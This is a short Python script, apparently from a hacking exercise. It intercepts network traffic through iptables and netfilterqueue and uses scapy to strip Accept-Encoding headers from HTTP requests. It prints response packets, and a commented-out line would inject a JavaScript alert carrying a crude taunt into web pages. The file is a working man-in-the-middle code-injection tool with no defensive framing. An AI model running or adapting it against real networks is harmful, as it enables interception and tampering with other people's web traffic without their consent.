import netfilterqueue
import scapy.all as scapy
import subprocess
import re


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.TCP].chksum
    del packet[scapy.IP].chksum
    return packet


def packet_queue(packet):
    code_injector = "<script> alert('Hacked b*tch')</script>"
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load)
            if modified_load:
                scapy_packet = set_load(scapy_packet, modified_load)


        elif scapy_packet[scapy.TCP].sport == 80:
            print(scapy_packet.show())

            # modified_load = scapy_packet[scapy.Raw].load.replace("</path>", "<script> alert('Hacked b*tch'); </script></path>")
            # if modified_load:
            #     scapy_packet = set_load(scapy_packet, modified_load)
        packet.set_payload(str(scapy_packet))
    packet.accept()


subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"])
subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"])
queue=netfilterqueue.NetfilterQueue()
queue.bind(0, packet_queue)
queue.run()